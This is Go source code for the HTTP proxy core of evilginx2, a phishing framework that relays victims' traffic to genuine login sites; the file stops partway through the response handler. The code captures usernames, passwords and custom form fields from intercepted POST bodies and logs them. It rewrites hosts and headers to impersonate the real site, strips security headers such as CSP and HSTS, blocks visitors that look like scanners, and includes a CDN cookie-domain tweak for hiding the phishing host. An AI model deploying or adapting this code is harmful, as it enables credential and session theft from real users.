/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
	"github.com/inconshreveable/go-vhost"
	http_dialer "github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	HOME_DIR = ".evilginx"
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second
)

// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	gophish           *GoPhish
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	session_mtx       sync.Mutex
}

type ProxySession struct {
	SessionId    string
	Created      bool
	PhishDomain  string
	PhishletName string
	Index        int
}

// set the value of the specified key in the JSON body
func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil, err
	}
	data[key] = value
	newBody, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	return newBody, nil
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		gophish:           NewGoPhish(),
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
	}

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyConfig.Enabled {
		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
		}
	}

	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:    "",
				Created:      false,
				PhishDomain:  "",
				PhishletName: "",
				Index:        -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// handle ip blacklist
			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]

			// handle proxy headers
			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
			for _, h := range proxyHeaders {
				origin_ip := req.Header.Get(h)
				if origin_ip != "" {
					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
					break
				}
			}

			if p.cfg.GetBlacklistMode() != "off" {
				if p.bl.IsBlacklisted(from_ip) {
					if p.bl.IsVerbose() {
						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
					}
					return p.blockRequest(req)
				}
				if p.cfg.GetBlacklistMode() == "all" {
					if !p.bl.IsWhitelisted(from_ip) {
						err := p.bl.AddIP(from_ip)
						if p.bl.IsVerbose() {
							if err != nil {
								log.Error("blacklist: %s", err)
							} else {
								log.Warning("blacklisted ip address: %s", from_ip)
							}
						}
					}

					return p.blockRequest(req)
				}
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			o_host := req.Host
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}

			pl := p.getPhishletByPhishHost(req.Host)
			remote_addr := from_ip

			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")

			if js_inject_re.MatchString(req.URL.Path) {
				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 3 {
					session_id := ra[1]
					js_id := ra[2]
					if strings.HasSuffix(js_id, ".js") {
						js_id = js_id[:len(js_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							var js_params *map[string]string = nil
							js_params = &s.Params

							script, err := pl.GetScriptInjectById(js_id, js_params)
							if err == nil {
								d_body += script + "\n\n"
							} else {
								log.Warning("js_inject: script not found: '%s'", js_id)
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js_inject: session not found: '%s'", session_id)
						}
					}
				}
			} else if redir_re.MatchString(req.URL.Path) {
				ra := redir_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					if strings.HasSuffix(session_id, ".js") {
						// respond with injected javascript
						session_id = session_id[:len(session_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							if !s.IsDone {
								if s.RedirectURL != "" {
									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
									d_body += dynamic_redirect_js + "\n\n"
								}
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js: session not found: '%s'", session_id)
						}
					} else {
						if _, ok := p.sessions[session_id]; ok {
							redirect_url, ok := p.waitForRedirectUrl(session_id)
							if ok {
								type ResponseRedirectUrl struct {
									RedirectUrl string `json:"redirect_url"`
								}
								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
								if err == nil {
									s_index, _ := p.sids[session_id]
									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
									return req, resp
								}
							}
							resp := goproxy.NewResponse(req, "application/json", 408, "")
							return req, resp
						} else {
							log.Warning("api: session not found: '%s'", session_id)
						}
					}
				}
			}

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
					ps.PhishletName = pl_name
				}
				session_cookie := getSessionCookieName(pl_name, p.cookieName)

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						log.Debug("triggered lure for path '%s'", req_path)
					}

					var create_session bool = true
					var ok bool = false
					sc, err := req.Cookie(session_cookie)
					if err == nil {
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							create_session = false
							ps.SessionId = sc.Value
							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
						} else {
							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
							// not a lure path and IP is whitelisted

							// TODO: allow only retrieval of static content, without setting session ID

							create_session = false
							req_ok = true
							/*
								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
								if ok {
									create_session = false
									ps.Index, ok = p.sids[ps.SessionId]
								} else {
									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
								}*/
						}
					}

					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
						// session cookie not found
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								// check if lure is not paused
								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
									return p.blockRequest(req)
								}

								// check if lure user-agent filter is triggered
								if len(l.UserAgentFilter) > 0 {
									re, err := regexp.Compile(l.UserAgentFilter)
									if err == nil {
										if !re.MatchString(req.UserAgent()) {
											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

											if p.cfg.GetBlacklistMode() == "unauth" {
												if !p.bl.IsWhitelisted(from_ip) {
													err := p.bl.AddIP(from_ip)
													if p.bl.IsVerbose() {
														if err != nil {
															log.Error("blacklist: %s", err)
														} else {
															log.Warning("blacklisted ip address: %s", from_ip)
														}
													}
												}
											}
											return p.blockRequest(req)
										}
									} else {
										log.Error("lures: user-agent filter regexp is invalid: %v", err)
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									// set params from url arguments
									p.extractParams(session, req.URL)

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										if trackParam, ok := session.Params["o"]; ok {
											if trackParam == "track" {
												// gophish email tracker image
												rid, ok := session.Params["rid"]
												if ok && rid != "" {
													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
													if err != nil {
														log.Error("gophish: %s", err)
													}
													return p.trackerImage(req)
												}
											}
										}
									}

									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										rid, ok := session.Params["rid"]
										if ok && rid != "" {
											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
											if err != nil {
												log.Error("gophish: %s", err)
											}
										}
									}

									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									}

									session.RemoteAddr = remote_addr
									session.UserAgent = req.Header.Get("User-Agent")
									session.RedirectURL = pl.RedirectUrl
									if l.RedirectUrl != "" {
										session.RedirectURL = l.RedirectUrl
									}
									if session.RedirectURL != "" {
										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
									}
									session.PhishLure = l
									log.Debug("redirect URL (lure): %s", session.RedirectURL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

								if p.cfg.GetBlacklistMode() == "unauth" {
									if !p.bl.IsWhitelisted(from_ip) {
										err := p.bl.AddIP(from_ip)
										if p.bl.IsVerbose() {
											if err != nil {
												log.Error("blacklist: %s", err)
											} else {
												log.Warning("blacklisted ip address: %s", from_ip)
											}
										}
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}
				// req.Header.Set(p.getHomeDir(), o_host)

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
						if err == nil {
							// show html redirector if it is set for the current lure
							if l.Redirector != "" {
								if !p.isForwarderUrl(req.URL) {
									if s.RedirectorName == "" {
										s.RedirectorName = l.Redirector
										s.LureDirPath = req_path
									}

									t_dir := l.Redirector
									if !filepath.IsAbs(t_dir) {
										redirectors_dir := p.cfg.GetRedirectorsDir()
										t_dir = filepath.Join(redirectors_dir, t_dir)
									}

									index_path1 := filepath.Join(t_dir, "index.html")
									index_path2 := filepath.Join(t_dir, "index.htm")
									index_found := ""
									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
										index_found = index_path1
									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
										index_found = index_path2
									}

									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(index_found)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html redirector response")
											}
										} else {
											log.Error("lure: failed to read redirector file: %s", err)
										}

									} else {
										log.Error("lure: redirector file does not exist: %s", index_found)
									}
								}
							}
						} else if s.RedirectorName != "" {
							// session has already triggered a lure redirector - see if there are any files requested by the redirector

							rel_parts := []string{}
							req_path_parts := strings.Split(req_path, "/")
							lure_path_parts := strings.Split(s.LureDirPath, "/")

							for n, dname := range req_path_parts {
								if len(dname) > 0 {
									path_add := true
									if n < len(lure_path_parts) {
										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
										if req_path_parts[n] == lure_path_parts[n] {
											path_add = false
										}
									}
									if path_add {
										rel_parts = append(rel_parts, req_path_parts[n])
									}
								}

							}
							rel_path := filepath.Join(rel_parts...)
							//log.Debug("rel_path: %s", rel_path)

							t_dir := s.RedirectorName
							if !filepath.IsAbs(t_dir) {
								redirectors_dir := p.cfg.GetRedirectorsDir()
								t_dir = filepath.Join(redirectors_dir, t_dir)
							}

							path := filepath.Join(t_dir, rel_path)
							if _, err := os.Stat(path); !os.IsNotExist(err) {
								fdata, err := ioutil.ReadFile(path)
								if err == nil {
									//log.Debug("ext: %s", filepath.Ext(req_path))
									mime_type := getContentType(req_path, fdata)
									//log.Debug("mime_type: %s", mime_type)
									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
									if resp != nil {
										resp.Body = io.NopCloser(bytes.NewReader(fdata))
										return req, resp
									} else {
										log.Error("lure: failed to create redirector data file response")
									}
								} else {
									log.Error("lure: failed to read redirector data file: %s", err)
								}
							} else {
								//log.Warning("lure: template file does not exist: %s", path)
							}
						}
					}
				}

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						u, err := url.Parse(rurl)
						if err == nil {
							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
								if resp != nil {
									resp.Header.Add("Location", rurl)
									return req, resp
								}
							}
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// prevent caching
				req.Header.Set("Cache-Control", "no-cache")

				// fix sec-fetch-dest
				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
				if sec_fetch_dest != "" {
					if sec_fetch_dest == "iframe" {
						req.Header.Set("Sec-Fetch-Dest", "document")
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					// req.Header.Set(p.getHomeDir(), o_host)
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")

						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")

						if json_re.MatchString(contentType) {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if um != nil && len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if pm != nil && len(pm) > 1 {
									p.setSessionPassword(ps.SessionId, pm[1])
									log.Success("[%d] Password: [%s]", ps.Index, pm[1])
									if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							for _, cp := range pl.custom {
								if cp.tp == "json" {
									cm := cp.search.FindStringSubmatch(string(body))
									if cm != nil && len(cm) > 1 {
										p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
										log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
										if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
											log.Error("database: %v", err)
										}
									}
								}
							}

							// force post json
							for _, fp := range pl.forcePost {
								if fp.path.MatchString(req.URL.Path) {
									log.Debug("force_post: url matched: %s", req.URL.Path)
									ok_search := false
									if len(fp.search) > 0 {
										k_matched := len(fp.search)
										for _, fp_s := range fp.search {
											matches := fp_s.key.FindAllString(string(body), -1)
											for _, match := range matches {
												if fp_s.search.MatchString(match) {
													if k_matched > 0 {
														k_matched -= 1
													}
													log.Debug("force_post: [%d] matched - %s", k_matched, match)
													break
												}
											}
										}
										if k_matched == 0 {
											ok_search = true
										}
									} else {
										ok_search = true
									}
									if ok_search {
										for _, fp_f := range fp.force {
											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
											if err != nil {
												log.Debug("force_post: got error: %s", err)
											}
											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
										}
									}
									req.ContentLength = int64(len(body))
									log.Debug("force_post: body: %s len:%d", body, len(body))
								}
							}

						} else if form_re.MatchString(contentType) {

							if req.ParseForm() == nil && req.PostForm != nil && len(req.PostForm) > 0 {
								log.Debug("POST: %s", req.URL.Path)

								for k, v := range req.PostForm {
									// patch phishing URLs in POST params with original domains

									if pl.username.key != nil && pl.username.search != nil && pl.username.key.MatchString(k) {
										um := pl.username.search.FindStringSubmatch(v[0])
										if um != nil && len(um) > 1 {
											p.setSessionUsername(ps.SessionId, um[1])
											log.Success("[%d] Username: [%s]", ps.Index, um[1])
											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									if pl.password.key != nil && pl.password.search != nil && pl.password.key.MatchString(k) {
										pm := pl.password.search.FindStringSubmatch(v[0])
										if pm != nil && len(pm) > 1 {
											p.setSessionPassword(ps.SessionId, pm[1])
											log.Success("[%d] Password: [%s]", ps.Index, pm[1])
											if err := p.db.SetSessionPassword(ps.SessionId, pm[1]); err != nil {
												log.Error("database: %v", err)
											}
										}
									}
									for _, cp := range pl.custom {
										if cp.key != nil && cp.search != nil && cp.key.MatchString(k) {
											cm := cp.search.FindStringSubmatch(v[0])
											if cm != nil && len(cm) > 1 {
												p.setSessionCustom(ps.SessionId, cp.key_s, cm[1])
												log.Success("[%d] Custom: [%s] = [%s]", ps.Index, cp.key_s, cm[1])
												if err := p.db.SetSessionCustom(ps.SessionId, cp.key_s, cm[1]); err != nil {
													log.Error("database: %v", err)
												}
											}
										}
									}
								}

								for k, v := range req.PostForm {
									for i, vv := range v {
										// patch phishing URLs in POST params with original domains
										req.PostForm[k][i] = string(p.patchUrls(pl, []byte(vv), CONVERT_TO_ORIGINAL_URLS))
									}
								}

								for k, v := range req.PostForm {
									if len(v) > 0 {
										log.Debug("POST %s = %s", k, v[0])
									}
								}

								body = []byte(req.PostForm.Encode())
								req.ContentLength = int64(len(body))

								// force posts
								for _, fp := range pl.forcePost {
									if fp.path.MatchString(req.URL.Path) {
										log.Debug("force_post: url matched: %s", req.URL.Path)
										ok_search := false
										if len(fp.search) > 0 {
											k_matched := len(fp.search)
											for _, fp_s := range fp.search {
												for k, v := range req.PostForm {
													if fp_s.key.MatchString(k) && fp_s.search.MatchString(v[0]) {
														if k_matched > 0 {
															k_matched -= 1
														}
														log.Debug("force_post: [%d] matched - %s = %s", k_matched, k, v[0])
														break
													}
												}
											}
											if k_matched == 0 {
												ok_search = true
											}
										} else {
											ok_search = true
										}

										if ok_search {
											for _, fp_f := range fp.force {
												req.PostForm.Set(fp_f.key, fp_f.value)
											}
											body = []byte(req.PostForm.Encode())
											req.ContentLength = int64(len(body))
											log.Debug("force_post: body: %s len:%d", body, len(body))
										}
									}
								}

							}

						}
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
					}
				}

				// check if request should be intercepted
				if pl != nil {
					if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
						for _, ic := range pl.intercept {
							//log.Debug("ic.domain:%s r_host:%s", ic.domain, r_host)
							//log.Debug("ic.path:%s path:%s", ic.path, req.URL.Path)
							if ic.domain == r_host && ic.path.MatchString(req.URL.Path) {
								return p.interceptRequest(req, ic.http_status, ic.body, ic.mime)
							}
						}
					}
				}

				if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
					s, ok := p.sessions[ps.SessionId]
					if ok && !s.IsDone {
						for _, au := range pl.authUrls {
							if au.MatchString(req.URL.Path) {
								s.Finish(true)
								break
							}
						}
					}
				}
			}

			return req, nil
		})

	p.Proxy.OnResponse().
		DoFunc(func(resp *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
			if resp == nil {
				return nil
			}

			// handle session
			// Below is the current fix to utilize CDN's, edit line "Domain: azureedge.ent"
			ck := &http.Cookie{}
			ps := ctx.UserData.(*ProxySession)
			if ps.SessionId != "" {
				if ps.Created {
					ck = &http.Cookie{
						Name:    getSessionCookieName(ps.PhishletName, p.cookieName),
						Value:   ps.SessionId,
						Path:    "/",
						Domain:  "*.azureedge.net",
						Expires: time.Now().Add(60 * time.Minute),
					}
				}
			}

			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
			if allow_origin != "" && allow_origin != "*" {
				if u, err := url.Parse(allow_origin); err == nil {
					if o_host, ok := p.replaceHostWithPhished(u.Host); ok {
						resp.Header.Set("Access-Control-Allow-Origin", u.Scheme+"://"+o_host)
					}
				} else {
					log.Warning("can't parse URL from 'Access-Control-Allow-Origin' header: %s", allow_origin)
				}
				resp.Header.Set("Access-Control-Allow-Credentials", "true")
			}
			var rm_headers = []string{
				"Content-Security-Policy",
				"Content-Security-Policy-Report-Only",
				"Strict-Transport-Security",
				"X-XSS-Protection",
				"X-Content-Type-Options",
				"X-Frame-Options",
			}
			for _, hdr := range rm_headers {
				resp.Header.Del(hdr)
			}

			redirect_set := false
			if s, ok := p.sessions[ps.SessionId]; ok {
				if s.RedirectURL != "" {
					redirect_set = true
				}
			}

			req_hostname := strings.ToLower(resp.Request.Host)

			// if "Location" header is present, make sure to redirect to the phishing domain
			r_url, err := resp.Location()
			if err == nil {
				if r_host, ok := p.replaceHostWithPhished(r_url.Host); ok {
					r_url.Host = r_host
					resp.Header.Set("Location", r_url.String())
				}
			}

			// fix cookies
